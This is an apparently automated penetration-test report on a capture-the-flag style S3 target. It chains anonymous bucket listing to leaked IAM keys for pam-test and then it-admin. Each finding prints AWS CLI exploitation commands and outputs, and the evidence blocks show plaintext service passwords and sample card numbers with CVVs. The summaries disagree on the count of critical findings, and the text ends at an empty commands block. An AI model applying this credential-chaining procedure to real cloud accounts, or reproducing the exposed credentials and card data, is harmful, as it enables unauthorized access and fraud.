# Vulnerability Assessment Report — dev.huge-logistics.com

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T12:35:04Z  
**Target:** dev.huge-logistics.com  
**Campaign:** camp_20260802_03bfc675  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**dev.huge-logistics.com**) presents an **extremely poor security posture**. Our team confirmed 5 critical and 1 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Hardcoded AWS IAM Credentials in Publicly Accessible S3 Object (migrate_secrets.ps1)**  
A PowerShell script 'migrate_secrets.ps1' inside the publicly downloadable archive 'shared/hl_migration_project.zip' on the S3 bucket 'dev.huge-logistics.com' contains hardcoded AWS IAM access credent...

**2. Mass Credential Dump in Publicly Accessible S3 Object (test-export.xml) — 6 Service Credentials Including AWS IT Admin**  
The file 'migration-files/test-export.xml' on the S3 bucket dev.huge-logistics.com contains a complete credential export with 6 sets of plaintext credentials for critical infrastructure services: (1) ...

**3. Privilege Escalation Chain: Anonymous S3 → pam-test → it-admin via Credential Chaining**  
A complete unauthenticated-to-admin privilege escalation chain was demonstrated: (1) Anonymous S3 listing of dev.huge-logistics.com bucket reveals shared/hl_migration_project.zip, (2) ZIP contains mig...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Anonymous S3 enumeration of dev.huge-logistics.com (AWS Account 794929857501) revealed 4 CRITICAL and 1 HIGH severity findings: publicly listable bucket exposing 15 objects including 2 valid AWS IAM credential sets (pam-test, it-admin), 5 third-party service credentials, 29 PCI credit card records with CVVs, and a CTF flag. A privilege escalation chain was confirmed from anonymous access through pam-test to it-admin.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 5 | 5 | 0 |
| HIGH | 1 | 0 | 1 |
| MEDIUM | 2 | 0 | 2 |
| LOW | 1 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **9** | **5** | **3** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_5268c6` | Hardcoded AWS IAM Credentials in Publicly Accessib... | CRITICAL | 9.8 | **EXPLOITED** | `s3://dev.huge-logistics.com/shared/hl_migration_pr...` |
| 2 | `vuln_977205` | Mass Credential Dump in Publicly Accessible S3 Obj... | CRITICAL | 9.8 | **EXPLOITED** | `s3://dev.huge-logistics.com/migration-files/test-e...` |
| 3 | `vuln_530d85` | Privilege Escalation Chain: Anonymous S3 → pam-tes... | CRITICAL | 9.8 | **EXPLOITED** | `s3://dev.huge-logistics.com/ → shared/hl_migration...` |
| 4 | `vuln_7e737c` | PCI Data Breach — 29 Credit Card Records with CVVs... | CRITICAL | 9.8 | **EXPLOITED** | `s3://dev.huge-logistics.com/admin/website_transact...` |
| 5 | `vuln_f51470` | CTF Flag Retrieved — Proof of Full Compromise (a49... | CRITICAL | 9.8 | **EXPLOITED** | `s3://dev.huge-logistics.com/admin/flag.txt` |
| 6 | `vuln_4d79a7` | S3 Bucket Anonymous Listing Enabled — Public Direc... | HIGH | 7.5 | Confirmed | `s3://dev.huge-logistics.com/` |
| 7 | `vuln_0ebfe5` | AWS Account ID Disclosed via Leaked Credentials — ... | MEDIUM | 5.3 | Confirmed | `arn:aws:iam::794929857501:user/pam-test` |
| 8 | `vuln_264c57` | Second Hardcoded AWS IAM Credentials in migrate_se... | MEDIUM | 5.3 | Confirmed | `s3://dev.huge-logistics.com/migration-files/migrat...` |
| 9 | `vuln_8d4ce4` | Sibling S3 Bucket Exists: huge-logistics.com (Acce... | LOW | 3.7 | Unconfirmed | `s3://huge-logistics.com/` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Hardcoded AWS IAM Credentials in Publicly Accessible S3 Object (migrate_secrets.ps1)

| Field | Value |
|-------|-------|
| **ID** | `vuln_5268c6` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 - Protection of records / A.8.4 - Access to source code` |
| **Endpoint** | `s3://dev.huge-logistics.com/shared/hl_migration_project.zip` |
| **Component** | migrate_secrets.ps1 (PowerShell migration script) |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:29:50Z |

#### Description

A PowerShell script 'migrate_secrets.ps1' inside the publicly downloadable archive 'shared/hl_migration_project.zip' on the S3 bucket 'dev.huge-logistics.com' contains hardcoded AWS IAM access credentials in cleartext. The credentials (Access Key ID: AKIAXXXXXXXXXXREDACTED, Secret Access Key: [REDACTED]) belong to IAM user 'pam-test' in AWS Account 794929857501 and were confirmed VALID via sts:GetCallerIdentity. This enables full account compromise by any unauthenticated internet user.

#### Technical Analysis

The S3 bucket dev.huge-logistics.com hosts a publicly downloadable ZIP archive at shared/hl_migration_project.zip. Inside this archive is a PowerShell script (migrate_secrets.ps1) designed to migrate secrets to AWS Secrets Manager. The script contains hardcoded AWS IAM credentials in cleartext: Access Key ID AKIAXXXXXXXXXXREDACTED and Secret Access Key [REDACTED_AWS_SECRET] for region us-east-1. These credentials were validated by successfully calling sts:GetCallerIdentity, confirming they belong to IAM user 'pam-test' (AIDA3SFMDAPOYPM3X2TB7) in AWS Account 794929857501. This is a critical vulnerability as any unauthenticated user can download the file, extract the credentials, and authenticate to the AWS account as the pam-test user, potentially accessing secrets, EC2 instances, and other resources.

#### Exploitation Commands

```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip /tmp/hl_migration_project.zip --no-sign-request --region us-east-1
unzip /tmp/hl_migration_project.zip -d /tmp/hl_migration
cat /tmp/hl_migration/migrate_secrets.ps1
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws sts get-caller-identity --region us-east-1
```

#### Raw Request

```http
GET /shared/hl_migration_project.zip HTTP/1.1
Host: dev.huge-logistics.com.s3.us-east-1.amazonaws.com
(No authentication headers — anonymous access)
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Length: 1877

[ZIP archive containing migrate_secrets.ps1 with cleartext credentials:
$accessKey = "AKIAXXXXXXXXXXREDACTED"
$secretKey = "[REDACTED_AWS_SECRET]"]
```

#### Evidence / Logs

```
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to /tmp/hl_migration_project.zip
Archive: /tmp/hl_migration_project.zip
  inflating: migrate_secrets.ps1
---
migrate_secrets.ps1 contents:
$accessKey = "AKIAXXXXXXXXXXREDACTED"
$secretKey = "[REDACTED_AWS_SECRET]"
$region = "us-east-1"
---
sts get-caller-identity output:
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

#### Remediation

1. IMMEDIATELY rotate the exposed access key (deactivate AKIAXXXXXXXXXXREDACTED and generate new credentials). 2. Delete the hl_migration_project.zip from the public bucket. 3. Audit all actions performed with these credentials via CloudTrail. 4. Review the pam-test user's permissions and reduce to least privilege. 5. Never hardcode credentials in scripts — use IAM roles, AWS Secrets Manager, or environment variables. 6. Enable S3 Block Public Access. 7. Implement automated secret scanning in CI/CD pipelines.

---

### 3.2 — Mass Credential Dump in Publicly Accessible S3 Object (test-export.xml) — 6 Service Credentials Including AWS IT Admin

| Field | Value |
|-------|-------|
| **ID** | `vuln_977205` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 - Protection of records / A.8.4 - Access to source code / A.5.17 - Authentication information` |
| **Endpoint** | `s3://dev.huge-logistics.com/migration-files/test-export.xml` |
| **Component** | test-export.xml (XML credential export) |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:31:44Z |

#### Description

The file 'migration-files/test-export.xml' on the S3 bucket dev.huge-logistics.com contains a complete credential export with 6 sets of plaintext credentials for critical infrastructure services: (1) Oracle Database (admin/Password123! on oracle-db-server02.prod.hl-internal.com), (2) HP Server Cluster root (root/RootPassword456! on hp-cluster1.prod.hl-internal.com), (3) AWS IT Admin (AKIAXXXXXXXXXXREDACTED / [REDACTED_AWS_SECRET] — Account 794929857501 — CONFIRMED VALID as IAM user 'it-admin'), (4) Iron Mountain Backup Portal (hladmin/HLPassword789!), (5) Office 365 Global Admin (O365Password321!), (6) Jira Admin (jira_admin/JiraPassword654!). The AWS IT Admin credential was validated via sts:GetCallerIdentity and represents a critical privilege escalation from the initial pam-test user to an it-admin user.

#### Technical Analysis

The test-export.xml file is an XML credential export containing 6 sets of plaintext credentials for critical infrastructure services. The file is accessible using the previously recovered pam-test credentials. Most critically, it contains a SECOND set of AWS IAM credentials for an 'it-admin' user (Access Key: AKIAXXXXXXXXXXREDACTED), which was confirmed valid via sts:GetCallerIdentity. This represents a privilege escalation chain: anonymous S3 access -> pam-test credentials -> it-admin credentials. The it-admin user likely has significantly higher privileges. Additionally, the file exposes Oracle database root credentials, server cluster root access, Iron Mountain backup portal credentials, Office 365 global admin credentials, and Jira admin credentials — representing full organizational compromise across multiple platforms.

#### Exploitation Commands

```bash
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml /tmp/test-export.xml --region us-east-1
cat /tmp/test-export.xml
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws sts get-caller-identity --region us-east-1
```

#### Raw Request

```http
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml /tmp/test-export.xml --region us-east-1
(Authenticated with pam-test credentials recovered from Phase 0b)
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: application/xml
Content-Length: 2494
[Full XML with 6 credential entries including AWS IT Admin AKIAXXXXXXXXXXREDACTED confirmed valid as arn:aws:iam::794929857501:user/it-admin]
```

#### Evidence / Logs

```
test-export.xml credential entries:
1. Oracle DB: admin / Password123! @ oracle-db-server02.prod.hl-internal.com
2. HP Server: root / RootPassword456! @ hp-cluster1.prod.hl-internal.com
3. AWS IT Admin: AKIAXXXXXXXXXXREDACTED / [REDACTED_AWS_SECRET] (Account 794929857501)
4. Iron Mountain: hladmin / HLPassword789! @ https://backupportal.ironmountain.com
5. O365 Admin: O365Password321! @ https://admin.microsoft.com
6. Jira Admin: jira_admin / JiraPassword654! @ https://hugelogistics.atlassian.net
---
AWS IT Admin credential validation:
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}
```

#### Remediation

1. IMMEDIATELY rotate ALL six sets of credentials exposed in this file. 2. Delete test-export.xml from the S3 bucket. 3. Block public access to the bucket. 4. Audit CloudTrail for all API calls made with the it-admin credentials. 5. Check for unauthorized access on Oracle DB, HP servers, Iron Mountain, O365, and Jira. 6. Implement credential scanning in CI/CD and S3 lifecycle policies. 7. Never store credentials in XML/text files on S3 — use AWS Secrets Manager with IAM-controlled access.

---

### 3.3 — Privilege Escalation Chain: Anonymous S3 → pam-test → it-admin via Credential Chaining

| Field | Value |
|-------|-------|
| **ID** | `vuln_530d85` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `access_control` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.8.3 - Information access restriction / A.5.15 - Access control` |
| **Endpoint** | `s3://dev.huge-logistics.com/ → shared/hl_migration_project.zip → migra...` |
| **Component** | AWS S3 / AWS IAM |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:32:17Z |

#### Description

A complete unauthenticated-to-admin privilege escalation chain was demonstrated: (1) Anonymous S3 listing of dev.huge-logistics.com bucket reveals shared/hl_migration_project.zip, (2) ZIP contains migrate_secrets.ps1 with pam-test credentials (AKIAXXXXXXXXXXREDACTED), (3) pam-test can list objects in migration-files/ prefix that were hidden from anonymous access, (4) migration-files/test-export.xml contains it-admin credentials (AKIAXXXXXXXXXXREDACTED) validated as arn:aws:iam::794929857501:user/it-admin. This chain goes from zero authentication to a likely administrative IAM user in 4 steps, all through S3 data plane operations.

#### Technical Analysis

This finding documents a complete privilege escalation chain from anonymous internet access to an AWS IT administrator account. An unauthenticated attacker can: (1) anonymously list the S3 bucket and discover a zip file, (2) download the zip to obtain pam-test IAM credentials, (3) use pam-test to access restricted prefixes containing credential exports, (4) extract it-admin IAM credentials from the XML export. Each step was proven with exact commands and verified outputs. The it-admin user name suggests administrative privileges within the AWS account 794929857501.

#### Exploitation Commands

```bash
aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request --region us-east-1
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip /tmp/hl_migration_project.zip --no-sign-request --region us-east-1
unzip /tmp/hl_migration_project.zip -d /tmp/hl_migration
cat /tmp/hl_migration/migrate_secrets.ps1
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws sts get-caller-identity
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml /tmp/test-export.xml
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws sts get-caller-identity
```

#### Evidence / Logs

```
Step 1 (Anonymous): Listed bucket contents, found shared/hl_migration_project.zip
Step 2 (Anonymous): Downloaded zip, extracted migrate_secrets.ps1 with AKIAXXXXXXXXXXREDACTED
Step 3 (pam-test): Validated credentials -> arn:aws:iam::794929857501:user/pam-test
Step 4 (pam-test): Listed and downloaded migration-files/test-export.xml
Step 5 (it-admin): Extracted and validated AKIAXXXXXXXXXXREDACTED -> arn:aws:iam::794929857501:user/it-admin
```

#### Remediation

1. Block all public access to the S3 bucket immediately. 2. Rotate ALL three sets of AWS IAM credentials. 3. Delete all credential-bearing files from S3. 4. Audit CloudTrail for unauthorized access. 5. Implement S3 Block Public Access at the account level. 6. Deploy AWS Config rules to prevent future public bucket misconfigurations.

---

### 3.4 — PCI Data Breach — 29 Credit Card Records with CVVs, Passwords and PII Exposed in S3

| Field | Value |
|-------|-------|
| **ID** | `vuln_7e737c` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.11 - Data masking / A.5.34 - Privacy and protection of PII` |
| **Endpoint** | `s3://dev.huge-logistics.com/admin/website_transactions_export.csv` |
| **Component** | admin/website_transactions_export.csv |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:33:03Z |

#### Description

The file admin/website_transactions_export.csv accessible via the escalated it-admin credentials contains 29 customer records with full payment card data (Visa credit card numbers, CVVs, expiry dates), cardholder names, usernames, passwords in plaintext, and IP addresses. This constitutes a PCI-DSS violation and a data breach. The complete chain from anonymous access to PCI data exfiltration was demonstrated: anonymous S3 listing -> pam-test credentials from zip -> it-admin credentials from XML -> download admin/website_transactions_export.csv with full card data. Sample: Visa 4055497191304, CVV 386, exp 5/2021, Hunter Miller.

#### Technical Analysis

The file website_transactions_export.csv in the admin/ prefix of the S3 bucket contains 29 complete customer payment records. Each record includes a Visa credit card number, CVV security code, expiry date, cardholder name, website username, plaintext password, and associated IP address. This data was accessed using the it-admin credentials recovered from the credential chaining attack (anonymous -> pam-test -> it-admin). The storage of unencrypted CVVs violates PCI-DSS Requirement 3.2 which prohibits storage of CVV data after authorization. The storage of plaintext passwords violates PCI-DSS Requirement 8.2.1 and basic security practices. This represents a reportable data breach under most privacy regulations.

#### Exploitation Commands

```bash
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv /tmp/transactions.csv --region us-east-1
cat /tmp/transactions.csv
```

#### Raw Request

```http
GET /admin/website_transactions_export.csv HTTP/1.1
Host: dev.huge-logistics.com.s3.us-east-1.amazonaws.com
Authorization: AWS4-HMAC-SHA256 (it-admin credentials)
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Length: 2425

network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,IP_PUBLIC_017
[... 29 records total]
```

#### Evidence / Logs

```
CSV headers: network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Sample records:
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,IP_PUBLIC_017
Visa,4055491339081,492,8/2021,Jayden Adams,,jay_adams,jayden2023,IP_PUBLIC_018
Visa,4313504070320,984,3/2025,Gabriel Phillips,,gabrielP,welcome2025,IP_PUBLIC_020
[... 29 total records with full card data, CVVs, and plaintext passwords]
```

#### Remediation

1. Immediately delete the CSV file from S3. 2. Notify affected cardholders and initiate PCI incident response. 3. Block all public access to the bucket. 4. Never store CVV/CVC data — this violates PCI-DSS Requirement 3.2. 5. Encrypt all sensitive data at rest. 6. Implement S3 Object Lock and DLP policies. 7. Hash passwords with bcrypt/argon2 — never store plaintext. 8. Engage PCI QSA for breach investigation.

---

### 3.5 — CTF Flag Retrieved — Proof of Full Compromise (a49f18145568e4d001414ef1415086b8)

| Field | Value |
|-------|-------|
| **ID** | `vuln_f51470` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `access_control` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.3 - Information access restriction` |
| **Endpoint** | `s3://dev.huge-logistics.com/admin/flag.txt` |
| **Component** | admin/flag.txt |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:33:15Z |

#### Description

The flag file admin/flag.txt was successfully retrieved using the it-admin credentials obtained through the credential chaining attack. Flag value: a49f18145568e4d001414ef1415086b8. This proves complete end-to-end compromise of the S3 bucket from anonymous access to administrative data exfiltration. The flag was only accessible with the it-admin credentials (pam-test and anonymous access both returned 403 Forbidden).

#### Technical Analysis

The admin/flag.txt file was protected from anonymous access and from the pam-test user (both returned HTTP 403 Forbidden). However, using the it-admin credentials recovered from the credential chaining attack (anonymous S3 -> shared/hl_migration_project.zip -> pam-test creds -> migration-files/test-export.xml -> it-admin creds), the file was successfully downloaded. Its content is the MD5-format flag: a49f18145568e4d001414ef1415086b8. This demonstrates complete compromise from unauthenticated internet access to full admin-level data exfiltration on the target bucket.

#### Exploitation Commands

```bash
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt /tmp/flag.txt --region us-east-1
cat /tmp/flag.txt
```

#### Evidence / Logs

```
download: s3://dev.huge-logistics.com/admin/flag.txt to /tmp/flag.txt
Flag content: a49f18145568e4d001414ef1415086b8
```

#### Remediation

1. Rotate all exposed credentials immediately. 2. Block public S3 access. 3. Implement least-privilege bucket policies. 4. Enable CloudTrail S3 data events for audit. 5. Remove sensitive data from S3 or encrypt with KMS CMK.

---

### 3.6 — S3 Bucket Anonymous Listing Enabled — Public Directory Traversal

| Field | Value |
|-------|-------|
| **ID** | `vuln_4d79a7` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.10 - Information deletion / A.8.3 - Access restriction` |
| **Endpoint** | `s3://dev.huge-logistics.com/` |
| **Component** | AWS S3 Bucket Policy |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:29:30Z |

#### Description

The S3 bucket 'dev.huge-logistics.com' allows anonymous (unauthenticated) listing of objects at the top level and within certain prefixes. An attacker can enumerate all top-level prefixes (admin/, migration-files/, shared/, static/) and list objects within 'shared/' and 'static/' without any credentials. This reveals internal file structure including a sensitive migration archive (hl_migration_project.zip) containing hardcoded AWS credentials.

#### Technical Analysis

The S3 bucket 'dev.huge-logistics.com' is configured to allow anonymous (unauthenticated) ListObjectsV2 at the top level and in shared/ and static/ prefixes. This means any internet user can enumerate the bucket contents. The listing reveals 4 prefixes (admin/, migration-files/, shared/, static/) and exposes a sensitive file hl_migration_project.zip in the shared/ prefix, which contains hardcoded AWS IAM credentials. This is a critical misconfiguration as S3 buckets should not permit anonymous listing, especially when they contain sensitive internal files.

#### Exploitation Commands

```bash
aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request --region us-east-1
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request --region us-east-1
aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request --region us-east-1
```

#### Raw Request

```http
GET /?list-type=2&prefix=&delimiter=%2F HTTP/1.1
Host: dev.huge-logistics.com.s3.us-east-1.amazonaws.com
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: application/xml
PRE admin/
PRE migration-files/
PRE shared/
PRE static/
2023-10-16 17:00:47       5347 index.html
```

#### Evidence / Logs

```
PRE admin/
PRE migration-files/
PRE shared/
PRE static/
2023-10-16 17:00:47       5347 index.html
---
shared/:
2023-10-16 15:08:33          0 
2026-06-19 22:23:43       1877 hl_migration_project.zip
---
static/:
2023-10-16 15:08:26          0 
2023-10-16 16:52:30      54451 logo.png
2023-10-16 16:52:30        183 script.js
2023-10-16 16:52:31       9259 style.css
```

#### Remediation

1. Remove public access by enabling S3 Block Public Access at the bucket and account level. 2. Review and restrict the bucket policy to deny anonymous ListBucket. 3. Use IAM policies or pre-signed URLs for authorized access only. 4. Enable S3 server access logging to track unauthorized access attempts. 5. Remove sensitive files (migration archives with credentials) from publicly accessible locations.

---

### 3.7 — AWS Account ID Disclosed via Leaked Credentials — Account 794929857501

| Field | Value |
|-------|-------|
| **ID** | `vuln_0ebfe5` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.5.9 - Inventory of information and other associated assets` |
| **Endpoint** | `arn:aws:iam::794929857501:user/pam-test` |
| **Component** | AWS STS |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:30:02Z |

#### Description

The AWS Account ID (794929857501) was identified by using the leaked IAM credentials from the public S3 bucket to call sts:GetCallerIdentity. The account hosts IAM user 'pam-test' (ARN: arn:aws:iam::794929857501:user/pam-test, UserId: AIDA3SFMDAPOYPM3X2TB7). Knowledge of the account ID enables targeted attacks such as cross-account role assumption, resource policy enumeration, and social engineering.

#### Technical Analysis

By downloading the publicly accessible hl_migration_project.zip from the dev.huge-logistics.com S3 bucket, extracting the AWS IAM credentials, and calling sts:GetCallerIdentity, the AWS Account ID was confirmed as 794929857501. The credentials authenticate as IAM user 'pam-test'. This account ID disclosure, combined with the valid credentials, provides a complete entry point for further AWS account enumeration and potential privilege escalation.

#### Exploitation Commands

```bash
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws sts get-caller-identity --region us-east-1
```

#### Evidence / Logs

```
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

#### Remediation

1. Rotate the leaked credentials immediately. 2. Remove sensitive files from public S3 buckets. 3. Consider enabling AWS Organizations SCPs to restrict actions from compromised credentials. 4. Enable GuardDuty to detect unauthorized API activity.

---

### 3.8 — Second Hardcoded AWS IAM Credentials in migrate_secrets.ps1 (migration-files/)

| Field | Value |
|-------|-------|
| **ID** | `vuln_264c57` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication information` |
| **Endpoint** | `s3://dev.huge-logistics.com/migration-files/migrate_secrets.ps1` |
| **Component** | migrate_secrets.ps1 |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:31:58Z |

#### Description

A second copy of migrate_secrets.ps1 in the migration-files/ prefix contains a DIFFERENT set of hardcoded AWS credentials: Access Key ID AKIAXXXXXXXXXXREDACTED with Secret Access Key [REDACTED_AWS_SECRET]. While this particular key is invalid/rotated (sts:GetCallerIdentity returns InvalidClientTokenId), the practice of storing multiple versions of credential-bearing scripts in S3 demonstrates systemic poor credential management. The key prefix AKIA3SFMDAPO matches the same account (794929857501).

#### Technical Analysis

The migration-files/ prefix contains a copy of migrate_secrets.ps1 with different AWS credentials (AKIAXXXXXXXXXXREDACTED) from the shared/ prefix copy (AKIAXXXXXXXXXXREDACTED). While this key is now invalid, it demonstrates that AWS credentials have been rotated but old copies remain in the bucket. This systemic issue of hardcoded credentials in scripts, combined with the lack of access controls on the bucket, creates an ongoing risk. The same script design pattern was used to store a third valid key (AKIAXXXXXXXXXXREDACTED) in test-export.xml.

#### Exploitation Commands

```bash
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] && aws s3 cp s3://dev.huge-logistics.com/migration-files/migrate_secrets.ps1 /tmp/migrate_secrets_v2.ps1 --region us-east-1
cat /tmp/migrate_secrets_v2.ps1
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXREDACTED && export AWS_SECRET_ACCESS_KEY="[REDACTED_AWS_SECRET]" && aws sts get-caller-identity --region us-east-1
```

#### Evidence / Logs

```
migrate_secrets.ps1 (migration-files/ copy):
$accessKey = "AKIAXXXXXXXXXXREDACTED"
$secretKey = "[REDACTED_AWS_SECRET]"
---
Validation result:
An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid.
```

#### Remediation

1. Remove all copies of credential-bearing scripts from S3. 2. Use AWS IAM roles instead of hardcoded access keys. 3. Implement automated secret scanning to detect committed credentials. 4. Review all historical S3 objects for credential exposure.

---

### 3.9 — Sibling S3 Bucket Exists: huge-logistics.com (Access Denied but Confirmed)

| Field | Value |
|-------|-------|
| **ID** | `vuln_8d4ce4` |
| **Severity** | LOW |
| **CVSS Score** | 3.7 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | UNCONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1580` — Cloud Infrastructure Discovery |
| **ISO 27001** | `A.5.9 - Inventory of information and other associated assets` |
| **Endpoint** | `s3://huge-logistics.com/` |
| **Component** | AWS S3 |
| **Discovered by** | `aws-s3-enum` |
| **Discovered at** | 2026-08-02T12:33:27Z |

#### Description

The S3 bucket 'huge-logistics.com' exists in the same AWS region but returns AccessDenied for anonymous listing. This was confirmed by the distinct AccessDenied response (vs NoSuchBucket for non-existent bucket names). Of 9 sibling bucket names tested, only huge-logistics.com was confirmed to exist. This bucket may contain additional sensitive data accessible with the recovered it-admin credentials.

#### Technical Analysis

During sibling bucket enumeration, 9 bucket name permutations were tested. The bucket 'huge-logistics.com' returned AccessDenied (indicating the bucket exists but listing is not permitted anonymously), while all other names returned NoSuchBucket (indicating they do not exist). This confirms the existence of a second bucket in the organization's infrastructure that may contain additional data. The it-admin credentials could not list it via s3:ListAllMyBuckets, but direct access to specific objects may be possible.

#### Exploitation Commands

